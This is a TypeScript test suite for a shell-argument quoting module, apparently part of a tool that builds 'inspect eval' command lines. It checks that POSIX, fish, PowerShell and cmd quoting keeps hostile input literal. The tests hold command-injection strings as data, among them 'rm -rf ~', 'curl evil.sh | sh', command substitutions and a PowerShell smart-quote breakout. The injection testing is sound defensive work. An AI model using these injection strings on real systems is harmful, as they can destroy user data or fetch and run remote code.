import * as assert from "assert";
import { spawnSync } from "child_process";
import { existsSync, mkdirSync, mkdtempSync, rmSync } from "fs";
import { tmpdir } from "os";
import { join } from "path";

import {
  quoteArg,
  quoteCommandLine,
  ShellKind,
  shellKindFromPath,
} from "../../core/shell-quote";

suite("Shell Quote Test Suite", () => {
  suite("quoteArg - posix", () => {
    test("returns safe tokens unchanged", () => {
      assert.strictEqual(quoteArg("inspect", "posix"), "inspect");
      assert.strictEqual(
        quoteArg("task.py@my_task", "posix"),
        "task.py@my_task"
      );
      assert.strictEqual(quoteArg("--limit=10", "posix"), "--limit=10");
    });

    test("single-quotes a value with spaces", () => {
      assert.strictEqual(quoteArg("my task", "posix"), "'my task'");
    });

    test("escapes embedded single quotes", () => {
      assert.strictEqual(quoteArg("it's", "posix"), "'it'\\''s'");
    });

    test("neutralizes shell metacharacters", () => {
      assert.strictEqual(
        quoteArg("task; rm -rf ~", "posix"),
        "'task; rm -rf ~'"
      );
    });
  });

  suite("quoteArg - fish", () => {
    test("escapes backslashes and quotes, including trailing backslashes", () => {
      assert.strictEqual(quoteArg("it's", "fish"), "'it\\'s'");
      assert.strictEqual(quoteArg("a\\", "fish"), "'a\\\\'");
      assert.strictEqual(quoteArg("\\'", "fish"), "'\\\\\\''");
      assert.strictEqual(quoteArg("", "fish"), "''");
      assert.strictEqual(quoteArg("task.py@demo", "fish"), "task.py@demo");
    });
  });

  // Run the generated text through real parsers. The only injected operation
  // used here would write a harmless marker inside a disposable test directory.
  for (const [shell, kind] of [
    ["sh", "posix"],
    ["bash", "posix"],
    ["fish", "fish"],
  ] as const satisfies ReadonlyArray<readonly [string, ShellKind]>) {
    suite(`real ${shell} argument round trips`, () => {
      suiteSetup(function () {
        // These fixtures contain Unix-only filenames and require a Unix shell
        // argv transport. Git Bash launched through Windows spawnSync also
        // undergoes Windows command-line escaping before Bash parses the text.
        if (process.platform === "win32") {
          this.skip();
        }
        const probe = spawnSync(
          shell,
          shell === "fish" ? ["--no-config", "--version"] : ["--version"],
          { encoding: "utf8" }
        );
        if (
          probe.error &&
          "code" in probe.error &&
          probe.error.code === "ENOENT"
        ) {
          if (shell === "fish" && process.env.REQUIRE_FISH_TESTS) {
            assert.fail("fish is required for this validation run");
          }
          this.skip();
        }
        assert.ifError(probe.error);
      });

      test("preserves targets and parameters without executing their contents", () => {
        const cwd = mkdtempSync(join(tmpdir(), "inspect-shell-quote-"));
        try {
          const values = [
            "",
            "task.py@demo",
            "my tasks/évaluation.py@demo",
            "../other tasks/t.py@x",
            "a,b",
            "@task",
            "--limit=10",
            "it's",
            "\\",
            "a\\\\b",
            "trailing\\",
            "a=\\",
            "b=;printf injected>marker;#",
            "line\nbreak",
            "tab\there",
            "both'\"quotes",
            "t\\';printf injected>marker;\\'.py@x",
            "$(printf injected>marker)",
            "(printf injected>marker)",
            "`printf injected>marker`",
            "$HOME",
            "*?[abc]{a,b}",
          ];
          // Exercise all short combinations around the vulnerable quote boundary.
          for (const a of ["\\", "'", ";", " "]) {
            for (const b of ["\\", "'", ";", " "]) {
              for (const c of ["\\", "'", ";", " "]) {
                values.push(`t${a}${b}${c}.py@x`);
              }
            }
          }
          const line = quoteCommandLine(["printf", "%s\\0", ...values], kind);
          const result = spawnSync(
            shell,
            [...(shell === "fish" ? ["--no-config"] : []), "-c", line],
            {
              cwd,
              encoding: "utf8",
              timeout: 5000,
            }
          );
          assert.ifError(result.error);
          assert.strictEqual(result.status, 0, result.stderr);
          assert.deepStrictEqual(result.stdout.split("\0"), [...values, ""]);
          assert.strictEqual(existsSync(join(cwd, "marker")), false);
        } finally {
          rmSync(cwd, { recursive: true, force: true });
        }
      });

      test("preserves a reused terminal's working directory", () => {
        const cwd = mkdtempSync(join(tmpdir(), "inspect-shell-cd-"));
        const directory = "tasks\\';printf injected>marker;\\'";
        mkdirSync(join(cwd, directory));
        try {
          const result = spawnSync(
            shell,
            [
              ...(shell === "fish" ? ["--no-config"] : []),
              "-c",
              `cd ${quoteArg(directory, kind)}; pwd`,
            ],
            {
              cwd,
              encoding: "utf8",
              timeout: 5000,
            }
          );
          assert.ifError(result.error);
          assert.strictEqual(result.status, 0, result.stderr);
          assert.ok(result.stdout.trimEnd().endsWith(`/${directory}`));
          assert.strictEqual(existsSync(join(cwd, "marker")), false);
        } finally {
          rmSync(cwd, { recursive: true, force: true });
        }
      });
    });
  }

  suite("quoteArg - powershell", () => {
    test("single-quotes a value with spaces", () => {
      assert.strictEqual(quoteArg("my task", "powershell"), "'my task'");
    });

    test("escapes embedded single quotes by doubling", () => {
      assert.strictEqual(quoteArg("it's", "powershell"), "'it''s'");
    });

    test("neutralizes shell metacharacters", () => {
      assert.strictEqual(
        quoteArg("task; rm $env:HOME", "powershell"),
        "'task; rm $env:HOME'"
      );
    });

    test("quotes a comma so PowerShell does not split it into an array", () => {
      // In PowerShell argument mode 'a,b' is the array operator; quoting keeps
      // it a single literal argument.
      assert.strictEqual(
        quoteArg("tasks.py@demo,--model-base-url,https://x", "powershell"),
        "'tasks.py@demo,--model-base-url,https://x'"
      );
      assert.strictEqual(quoteArg("1,2", "powershell"), "'1,2'");
    });

    test("doubles Unicode smart quotes so they cannot terminate the string", () => {
      // PowerShell treats U+2018–U+201B as single-quote characters, so an
      // embedded smart quote must be doubled or it would end the quoted string
      // and let the following text execute.
      const payload = "demo" + "’" + ";calc;" + "’";
      const quoted = quoteArg(payload, "powershell");
      assert.strictEqual(quoted, "'demo’’;calc;’’'");
    });

    test("quotes a leading @ (splatting/array subexpression)", () => {
      assert.strictEqual(quoteArg("@evil", "powershell"), "'@evil'");
    });

    test("still passes a comma unquoted to POSIX and cmd", () => {
      assert.strictEqual(quoteArg("1,2", "posix"), "1,2");
      assert.strictEqual(quoteArg("1,2", "cmd"), "1,2");
    });
  });

  suite("quoteArg - cmd", () => {
    test("double-quotes a value with spaces", () => {
      assert.strictEqual(quoteArg("my task", "cmd"), '"my task"');
    });

    test("caret-escapes cmd metacharacters", () => {
      assert.strictEqual(quoteArg("a&b|c", "cmd"), '"a^&b^|c"');
    });

    test("escapes embedded double quotes", () => {
      assert.strictEqual(quoteArg('say "hi"', "cmd"), '"say ""hi"""');
    });
  });

  suite("quoteCommandLine", () => {
    test("leaves safe tokens bare and only quotes what needs it", () => {
      // "inspect" and "eval" are safe; "my task.py@t" has a space and needs quoting.
      assert.strictEqual(
        quoteCommandLine(["inspect", "eval", "my task.py@t"], "posix"),
        "inspect eval 'my task.py@t'"
      );
    });

    test("quotes a hostile target as a single literal token", () => {
      const hostile = "task.py; curl evil.sh | sh";
      const line = quoteCommandLine(["inspect", "eval", hostile], "posix");
      assert.strictEqual(line, `inspect eval '${hostile}'`);
    });

    test("safe tokens are bare across all shell kinds", () => {
      assert.strictEqual(
        quoteCommandLine(["inspect", "eval", "task.py@my_task"], "powershell"),
        "inspect eval task.py@my_task"
      );
      assert.strictEqual(
        quoteCommandLine(["inspect", "eval", "task.py@my_task"], "cmd"),
        "inspect eval task.py@my_task"
      );
    });
  });

  suite("shellKindFromPath", () => {
    test("returns undefined when the shell can't be identified", () => {
      assert.strictEqual(shellKindFromPath(undefined), undefined);
      assert.strictEqual(shellKindFromPath(""), undefined);
      assert.strictEqual(
        shellKindFromPath("C:\\some\\custom-shell.exe"),
        undefined
      );
    });

    test("positively identifies known shells", () => {
      assert.strictEqual(shellKindFromPath("/bin/bash"), "posix");
      assert.strictEqual(shellKindFromPath("/opt/homebrew/bin/fish"), "fish");
      assert.strictEqual(shellKindFromPath("fish"), "fish");
      assert.strictEqual(shellKindFromPath("C:\\shells\\fish.exe"), "fish");
      assert.strictEqual(shellKindFromPath("cmd.exe"), "cmd");
      assert.strictEqual(shellKindFromPath("pwsh"), "powershell");
    });
  });
});
